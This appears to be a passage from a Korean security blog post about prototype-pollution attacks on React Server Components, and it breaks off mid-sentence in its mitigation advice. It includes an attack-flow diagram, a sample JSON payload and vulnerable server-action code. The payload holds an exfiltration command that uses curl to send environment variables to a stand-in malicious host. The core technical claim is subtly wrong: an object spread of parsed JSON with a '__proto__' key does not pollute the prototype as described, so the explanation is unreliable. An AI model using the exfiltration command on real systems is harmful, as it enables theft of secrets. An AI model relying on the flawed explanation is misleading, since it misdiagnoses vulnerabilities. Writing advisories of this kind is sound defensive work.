# RSC 취약점, 악성 페이로드 경계

최근 해커들이 리액트 서버 컴포넌트(RSC)의 취약점을 활용하여 악성 페이로드를 유포하는 공격이 급증하고 있습니다. 이 공격은 RSC의 아키텍처 특성을 악용하여 클라이언트와 서버 간의 신뢰 경계를 무너뜨리며, 원격 코드 실행으로 이어질 수 있는 심각한 위협입니다. 현재 다수의 최신 웹 애플리케이션이 이러한 위험에 노출되어 있으며, 즉각적인 패치와 보안 점검이 요구됩니다. 본 글에서는 해당 취약점의 기술적 원인과 실제 공격 시나리오를 분석하고, 효과적인 대응 전략을 제시합니다.

## 개요 (Introduction)

최근 프론트엔드 개발 생태계에서 가장 혁신적인 변화 중 하나는 리액트 서버 컴포넌트(React Server Components, RSC)의 도입입니다. RSC는 컴포넌트를 서버에서 렌더링하고 결과를 클라이언트로 스트리밍하여 번들 크기를 줄이고 성능을 극대화하는 것을 목표로 합니다. 그러나 이러한 아키텍처의 변화는 서버와 클라이언트 사이의 새로운 데이터 전송 계층을 만들어냈고, 공격자들에게는 새로운 공격 표면을 제공하게 되었습니다.

현재 보고된 이 취약점은 RSC의 데이터 직렬화 및 역직렬화 과정에서 발생하는 보안 검증 누락에 기인합니다. 해커들은 이를 악용하여 정상적인 RSC 페이로드 위장하거나 조작된 데이터를 주입함으로써, 의도하지 않은 코드를 서버나 클라이언트에서 실행시키고 있습니다. 이는 단순한 XSS(Cross-Site Scripting)를 넘어 서버 측 로직 Manipulation이 가능할 수 있어 그 위험도가 매우 높습니다. Next.js 등 RSC를 채택한 주요 프레임워크를 사용하는 조직은 이 문제가 단순한 라이브러리 이슈가 아닌, 애플리케이션의 핵심 보안 논리와 관련된 문제임을 인지하고 즉각적인 대응에 나서야 합니다.

## 기술적 분석 (Technical Analysis)

RSC 아키텍처에서 서버는 클라이언트에게 JSON과 유사한 특별한 형식의 페이로드를 전송합니다. 이 페이로드는 컴포넌트의 구조, Props, 그리고 자식 요소들에 대한 정보를 담고 있으며, 클라이언트의 리액트 런타임은 이를 파싱하여 UI를 구성합니다. 문제는 이 과정에서 전송되는 데이터의 무결성을 충분히 검증하지 않거나, 신뢰할 수 없는 데이터를 직접 컴포넌트의 Props나 상태로 병합할 때 발생합니다.

특히, 이번 공격에서 주목할 점은 **프로토타입 오염(Prototype Pollution)** 기법의 응용입니다. RSC 페이로드는 복잡한 중첩 객체 구조를 가질 수 있는데, 공격자는 이 구조적 특성을 악용하여 JavaScript의 기본 객체인 `Object.prototype`에 악성 프로퍼티를 주입하려 시도합니다. 만약 RSC를 처리하는 서버 사이드 렌더링 로직이나 클라이언트 하이드레이션(Hydration) 과정에서 프로토타입 체인을 신뢰한다면, 공격자는 권한 상승이나 세션 하이재킹과 같은 공격을 수행할 수 있습니다. 또한, 서버 액션(Server Actions)과 연계될 경우 사용자의 입력값이 검증 없이 직렬화되어 서버 측 로직을 트리거하는 보안 허점이 발생하기도 합니다.

아래 다이어그램은 공격자가 조작된 RSC 페이로드를 전송하여 시스템을 장악하는 공격 흐름을 시각화한 것입니다.

```mermaid
graph LR
    A[Attacker] -->|1. Craft Malicious RSC Payload| B[Client Browser]
    B -->|2. Request with Suspicious Props| C[Next.js / RSC Server]
    C -->|3. Deserialize & Parse| D[Vulnerable Component Handler]
    D -->|4. Prototype Pollution via Props| E[Application Runtime Context]
    E -->|5. Execute Arbitrary Code/Logic| F[Malicious Payload Deployment]
    F -->|6. Send Data to C2 Server| G[Attacker's Infrastructure]
```



## 실제 공격 예시 (Attack Example)

가상의 SaaS 대시보드 애플리케이션을 타겟으로 한 공격 시나리오를 살펴보겠습니다. 해당 애플리케이션은 사용자 설정을 저장하기 위해 RSC와 Server Actions를 사용합니다. 공격자는 사용자의 선호도를 저장하는 API 엔드포인트에 악성 JSON 객체를 주입하여 프로토타입 오염을 유도합니다.

공격자는 다음과 같이 조작된 JSON 데이터를 서버로 전송합니다:

```json
{
  "userPreferences": {
    "theme": "dark",
    "notifications": true,
    "__proto__": {
      "isAdmin": true,
      "exec": "curl http://malicious-server.com/steal?data=$(env)"
    }
  }
}
```

위 예시에서 `__proto__` 키는 JavaScript 객체 생성 시 프로토타입을 설정하는 특수 속성입니다. 만약 서버 측의 설정 처리 컴포넌트가 입력 데이터를 `Object.assign` 또는 유사한 방식으로 깊은 복사(Deep Merge) 없이 기존 설정 객체에 병합한다면, `isAdmin` 속성이 전역 객체의 프로토타입에 추가될 수 있습니다.

취약한 서버 컴포넌트 코드 예시는 다음과 같습니다:

```javascript
// 취약한 Server Component 예시
async function updateUserPreferences(formData) {
  // 사용자 입력을 안전하게 처리하지 않고 병합하는 취약점
  const currentSettings = await getCurrentUserSettings();

  // formData를 파싱하여 얻은 rawInput이 공격자의 JSON임
  const rawInput = parseFormData(formData);

  // 안전하지 않은 병합 로직: 프로토타입 오염 가능성 존재
  const newSettings = { ...currentSettings, ...rawInput };

  if (newSettings.isAdmin) {
    // 권한 상승 발생: 원래 관리자가 아님에도 불구하고 실행됨
    return <AdminDashboard />;
  }

  return <UserDashboard />;
}
```

이 코드에서 `rawInput`에 `__proto__`가 포함되어 있다면, `newSettings.isAdmin` 확인 시 프로토타입 체인을 타고 올라가 `true`를 반환하게 됩니다. 결과적으로 공격자는 관리자 권한을 획득하여 민감한 데이터에 접근하거나, `exec`와 같은 함수를 트리거하여 원격에서 악성 명령어를 실행할 수 있는 환경을 조성하게 됩니다.

## 완화 조치 및 방어 전략 (Mitigation)

이러한 RSC 기반 공격으로부터 시스템을 보호하기 위해서는 레이어별 방어 전략이 필요합니다.

**1. 즉시 적용 가능한 조치:**
*   **프레임워크 업데이트:** 사용 중인 React, Next.js, 그리고 관련 RSC 라이브러리를 최신 버전으로 즉시 업데이트해야 합니다. 최신 보안 패치
